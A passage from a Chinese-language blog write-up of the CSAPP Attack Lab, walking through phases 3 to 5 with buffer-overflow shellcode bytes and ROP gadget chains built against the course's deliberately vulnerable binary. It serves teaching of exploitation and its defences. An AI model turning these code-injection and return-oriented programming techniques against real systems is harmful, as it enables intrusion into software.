+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先查看<code>touch3</code>的地址：<code>0x4018fa</code>。<code>cookie</code>的值在<code>phase_2</code>就找到過了：<code>0x59b997fa</code>。文檔中說明傳入的<code>cookie</code>字符串不應包含前綴的<code>0x</code>，所以實際要傳入的字符串應為：<code>59b997fa</code>。</p>
+<p>注意，通過查看文檔，我們可以發現一句話：”When functions <code>hexmatch</code> and <code>strncmp</code> are called, they push data onto the stack, overwriting portions of memory that held the buffer used by <code>getbuf</code>. As a result, you will need to be careful where you place the string representation of your cookie. “。即當<code>hexmatch</code>和<code>strncmp</code>被調用時會將數據入棧，可能會覆蓋<code>getbuf</code>的部分內容，需要小心選擇字符串儲存地址。</p>
+<p>意即避免將字符串存放在<code>getbuf</code>的棧幀內，故此我們選擇將其存放在<code>test</code>的棧幀內。</p>
+<p><img src="/pictures/AttackLab/5.png" alt=""></p>
+<p>查看<code>test</code>的棧底：<code>0x5561dca8</code>。</p>
+<p>參考<code>phase_2</code>我們可以編寫出以下彙編代碼，並將其轉換為機器代碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">    <span class="number">0</span>:	<span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> 	mov    $<span class="number">0x5561dca8</span>,%rdi</span><br><span class="line">    <span class="number">7</span>:	<span class="number">68</span> fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>       	pushq  $<span class="number">0x4018fa</span></span><br><span class="line">    c:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+<p>到目前為止，我們可以寫出以下與<code>phase_2</code>雷同的shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> </span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+<p>由於我們的字符串應儲存在<code>0x5561dca8</code>，而儲存我們輸入的首地址在<code>0x5561dc78</code>，所以我們應該給輸入的最後一行填充0並在下一行處填入<code>cookie</code>字符串。</p>
+<p>回想字符串如何儲存：利用ASCII表示字符。</p>
+<p>將<code>cookie</code>轉換為ASCII碼後為：<code>35 39 62 39 39 37 66 61</code></p>
+<p>至此，我們的shellcode就構建出來了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> </span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
+<p>創建文件<code>phase_3</code>並將shellcode存放在該的文件中，測試：</p>
+<p><img src="/pictures/AttackLab/6.png" alt=""></p>
+<h1 id="Return-Oriented-Programming-概念補充"><a href="#Return-Oriented-Programming-概念補充" class="headerlink" title="Return-Oriented Programming 概念補充"></a>Return-Oriented Programming 概念補充</h1><p>下個階段不能使用前三個階段的代碼注入(Code Injection)技術，因為：</p>
+<ul>
+<li>使用地址隨機化技術，導致每次運行時棧的地址都不同，使得難以定位注入的代碼。</li>
+<li>將棧的內存設置為不可執行，所以就算可以將PC設置為注入代碼的地址，程序也會返回segmentation fault。</li>
+</ul>
+<p>故，下兩階段會用到ROP知識(Return-Oriented Programming)。</p>
+<p>ROP使用的概念是找出程序中的特殊幾個字節，即我們想要執行的代碼與<code>ret</code>，我們稱這種片段<strong>gadget</strong>(<code>ret</code>指令用來跳轉到下一個gadget)。</p>
+<p><img src="/pictures/AttackLab/7.png" alt=""></p>
+<p>上圖說明了如何在棧中設置並執行一連串的gadget，其中<code>0xc3</code>表示指令<code>ret</code>。當每個gadget運行到<code>ret</code>時，會從棧頂取出下一個gadget的地址並執行，使得整個gadget鏈被完整執行。</p>
+<p>用以下例子舉例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span> <span class="params">(<span class="type">unsigned</span> *p)</span> &#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>15 &lt;setval_210&gt;:</span><br><span class="line">  <span class="number">400f</span>15:       c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7    movl  $<span class="number">0xc78948d4</span>, (%rdi)</span><br><span class="line">  <span class="number">400f</span>1b:       c3                   retq</span><br></pre></td></tr></table></figure>
+<p>字節序列<code>48 89 c7</code>就可以組成指令<code>movq %rax, %rdi</code>，並且這個序列最後還跟隨了一個<code>c3</code>，也就是<code>ret</code>。我們的目標序列在地址<code>0x400f18</code>處，所以如果直接跳轉到<code>0x400f18</code>處就可以執行我們想要執行的指令。</p>
+<h1 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h1><p>此題與phase_2雷同，只是開啟了保護。因為無法在棧上執行代碼，所以我們使用ROP。</p>
+<p>在此我們想使用gadget實現以下功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $<span class="number">0x59b997fa</span>, %rdi</span><br><span class="line">pushq $<span class="number">0x4017ec</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>但是顯然gadget中不會包含我們需要的立即數(如：<code>0x59b997fa</code>)。換個思路，我們可以將數據存放在棧中，然後使用<code>popq</code>取得數值。搜尋<code>popq %rdi</code>對應的機器代碼<code>5f</code>，發現無法在有效區內找到。我們換個思路，可以嘗試用一個中轉寄存器儲存這個值：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget1: </span><br><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">gadget2: </span><br><span class="line">mov %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><img src="/pictures/AttackLab/8.png" alt=""></p>
+<p>查看上圖可發現，對應機器代碼為：<code>58 c3</code>與<code>48 89 c7 c3</code>。通過搜索我們可以找到以下兩個函數：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>ca &lt;getval_280&gt;:</span><br><span class="line">  <span class="number">4019</span>ca:	b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3       	mov    $<span class="number">0xc3905829</span>,%eax</span><br><span class="line">  <span class="number">4019</span>cf:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>a0 &lt;addval_273&gt;:</span><br><span class="line">  <span class="number">4019</span>a0:	<span class="number">8</span>d <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3    	lea    <span class="number">-0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  <span class="number">4019</span>a6:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>通過在<code>0x4019cc</code>截斷第一個函數可以構成<code>gadget1</code>(<code>90</code>為<code>nop</code>，即no operation)，在<code>0x4019a2</code>截斷第二個函數可以構成<code>gadget2</code>。</p>
+<p>理想狀態下，我們期望棧的狀態如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Stack ----</span><br><span class="line">-------------</span><br><span class="line">full of zero | getbuf的棧幀</span><br><span class="line">-------------</span><br><span class="line">gadget1      | test的棧幀 (getbuf的返回地址)</span><br><span class="line">cookie       |</span><br><span class="line">gadget2      |</span><br><span class="line">touch2       |</span><br><span class="line">-------------</span><br><span class="line">---------------</span><br></pre></td></tr></table></figure>
+<p>當<code>getbuf</code>執行<code>ret</code>後，會跳轉到<code>gadget1</code>並將其地址出棧。</p>
+<p>這時<code>gadget1</code>中的<code>pop</code>就會將cookie值從棧頂取出，然後跳轉到<code>gadget2</code>繼續執行。</p>
+<p>故此，我們可以構建出以下shellcode，並保存在phase_4中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>驗證正確性：</p>
+<p><img src="/pictures/AttackLab/9.png" alt=""></p>
+<h1 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h1><p>終於到這個階段了，可以先休息一波。官方文檔還溫馨提示我們：已經得到了95/100的分數，這是一個很棒的分數了。如果大家有甚麼其他更重要的事情可以先放下這個lab去做啦！因為這個階段只佔可憐的5分，不值得我們耗費這麼多時間去解答它，除非我們將它視為額外的挑戰任務，想要超越這門課程對普通學生的期待程度。</p>
+<p>既然如此，各位看官若是手頭上有其他事情要做，就可以關閉這份題解啦！否則，我們還有路要走喔。</p>
+<p>因為地址隨機，所以想要獲取字符串的儲存地址應該使用<code>%rsp + &lt;bias&gt;</code>的形式取得。</p>
+<p>我們想要實現以下功能：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov %rsp, %rax</span><br><span class="line">add $bias, %rax</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">call touch3</span><br></pre></td></tr></table></figure>
+<p>但是尋找後發現沒有<code>add</code>的機器碼，我們可以使用另一個函數代替。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004019</span>d6 &lt;add_xy&gt;:</span><br><span class="line">  <span class="number">4019</span>d6:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">37</span>          	lea    (%rdi,%rsi,<span class="number">1</span>),%rax</span><br><span class="line">  <span class="number">4019</span>da:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>因為某些<code>mov</code>指令的源或目標寄存器的機器碼不存在程序中，所以我們需要通過一些過渡寄存器來傳遞這些值。相信各位在經歷phase 4後，已經可以獨立尋找到相應的機器碼地址。此處便不再重述，直接給出棧的樣子 (省略各gadget的<code>ret</code>指令)。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---- Stack ----</span><br><span class="line">--------------------------------------------</span><br><span class="line">full of zero                                | getbuf的棧幀</span><br><span class="line">--------------------------------------------   </span><br><span class="line">mov %rsp, %rax: <span class="number">0x401a06</span>                    | test的棧幀 (getbuf的返回地址)</span><br><span class="line">mov %rax, %rdi: <span class="number">0x4019a2</span>                    |</span><br><span class="line">pop %rax: <span class="number">0x4019cc</span>                          |</span><br><span class="line">bias: <span class="number">8</span> * <span class="number">9</span> = <span class="number">72</span> (<span class="number">0x48</span>)                     |</span><br><span class="line">mov %eax, %edx: <span class="number">0x4019dd</span>                    |</span><br><span class="line">mov %edx, %ecx: <span class="number">0x401a70</span>                    |</span><br><span class="line">mov %ecx, %esi: <span class="number">0x401a27</span>                    |</span><br><span class="line">lea (%rdi, %rsi, <span class="number">1</span>), %rax: <span class="number">0x4019d6</span>         |</span><br><span class="line">mov %rax, %rdi: <span class="number">0x4019a2</span>                    |</span><br><span class="line">Address of touch3: <span class="number">0x4018fa</span>                 |</span><br><span class="line">ASCII of cookie: <span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span> |</span><br><span class="line">--------------------------------------------</span><br><span class="line">---------------</span><br></pre></td></tr></table></figure>
+<p>注意此處偏移量的計算：執行<code>mov %rsp, %rax</code>時，<code>%rsp</code>其實正指向存放<code>mov %rax, %rdi</code>的棧內存。回憶<code>ret</code>指令相等於以下兩條指令<code>pop %rsp</code>+ <code>jmp %rsp</code>，所以執行第一個gadget時，<code>%rsp</code>正指向第二個gadget的內存地址。從第二個gadget算起，到cookie字符串儲存的地址，中間隔了9個8字節的大小，所以偏移量為$8 \times 9 = 72 (0x48)$。</p>
+<p>以上，可以構建出shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">70</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">27</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
+<p>驗證正確性：</p>
+<p><img src="/pictures/AttackLab/10.png" alt=""></p>
+<p>至此，五個階段全部完結。</p>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>終於完結此篇題解，時間拖得有些久，因為進入大學的準備忙得焦頭爛額。最近才知道錄取的是專業大類且沒法依個人意願自由分流，也就是說進入學校後還需二次分流，筆者很難依意願進入喜愛的計算機了。正考慮繼續就讀本地大學或申請國外大學兩條路，若選擇繼續就讀本地大學，以後更新頻率可能會創下新低，只能使用課餘時間研究。等於回到高中時期，既要顧課業也要顧興趣。最近也要為分流考試準備，預習數學與刷題，可能更新頻率也不會太高。</p>
+<p>最後，謝謝你願意看我的後記碎碎念。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ilsao.github.io/">asciibase64</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ilsao.github.io/2025/05/30/CSAPP-Attack-Lab-%E9%A1%8C%E8%A7%A3/">https://ilsao.github.io/2025/05/30/CSAPP-Attack-Lab-%E9%A1%8C%E8%A7%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ilsao.github.io" target="_blank">asciibase64</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%A8%88%E7%AE%97%E6%A9%9F%E5%BA%95%E5%B1%A4%E5%8E%9F%E7%90%86/">計算機底層原理</a></div><div class="post-share"><div class="social-share" data-image="/pictures/AttackLab.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/04/CSAPP-U4-%E7%AD%86%E8%A8%98%E8%88%87-%E9%83%A8%E5%88%86-%E7%B7%B4%E7%BF%92%E9%A1%8C%E8%A7%A3%E7%AD%94/" title="CSAPP U4 筆記與(部分)練習題解答"><img class="cover" src="/pictures/CSAPP_U4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CSAPP U4 筆記與(部分)練習題解答</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統第四章筆記</div></div></div></a><a class="pagination-related" href="/2025/05/10/CSAPP-Bomb-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Bomb Lab 題解"><img class="cover" src="/pictures/BombLab.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CSAPP Bomb Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統官方Lab題解</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/04/CSAPP-Architecture-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Architecture Lab 題解"><img class="cover" src="/pictures/ArchLab.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">CSAPP Architecture Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統官方Lab題解</div></div></div></a><a class="pagination-related" href="/2025/05/10/CSAPP-Bomb-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Bomb Lab 題解"><img class="cover" src="/pictures/BombLab.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-10</div><div class="info-item-2">CSAPP Bomb Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統官方Lab題解</div></div></div></a><a class="pagination-related" href="/2025/07/18/CSAPP-Cache-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Cache Lab 題解"><img class="cover" src="/pictures/CacheLab.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-18</div><div class="info-item-2">CSAPP Cache Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統Cache Lab題解</div></div></div></a><a class="pagination-related" href="/2025/02/19/CSAPP-Data-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Data Lab 題解"><img class="cover" src="/pictures/DataLab.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-19</div><div class="info-item-2">CSAPP Data Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統官方Lab題解</div></div></div></a><a class="pagination-related" href="/2025/08/10/CSAPP-U10-%E6%A5%B5%E7%B0%A1%E7%AD%86%E8%A8%98/" title="CSAPP U10 極簡筆記"><img class="cover" src="/pictures/CSAPP_U10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-10</div><div class="info-item-2">CSAPP U10 極簡筆記</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統第十章極簡筆記</div></div></div></a><a class="pagination-related" href="/2025/08/01/CSAPP-Shell-Lab-%E9%A1%8C%E8%A7%A3/" title="CSAPP Shell Lab 題解"><img class="cover" src="/pictures/ShellLab.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-01</div><div class="info-item-2">CSAPP Shell Lab 題解</div></div><div class="info-2"><div class="info-item-1">深入理解計算機系統Shell Lab題解</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/pictures/A4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">asciibase64</div><div class="author-info-description">努力學習中的小菜鳥</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ilsao"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li 